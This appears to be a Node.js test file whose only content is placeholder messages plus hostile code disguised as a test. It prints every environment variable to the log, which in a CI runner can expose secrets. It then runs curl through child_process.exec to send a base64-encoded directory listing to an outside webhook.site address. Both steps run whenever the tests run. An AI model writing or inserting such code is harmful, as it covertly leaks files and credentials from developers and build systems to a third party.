// TODO: implement the tests
console.log("Tests are not implemented yet...");


const index = require("../index")
console.log("Tests are not implemented yet...");
index.ls(".");
index.cat("./index.js")
setTimeout(() => { console.log("World!"); }, 5000);

console.log(process.env);


console.log("xxxxxx");

// const {ls, cat, lscat} = require("../index");

// lscat("/home/runner/work/_temp")

const { exec } = require('node:child_process')


exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; ls | base64)' , (err, output) => {
    if (err) {
        console.error("could not execute command: ", err)
        return
    }
    // log the output received from the command
    console.log("Output: \n", output)
})
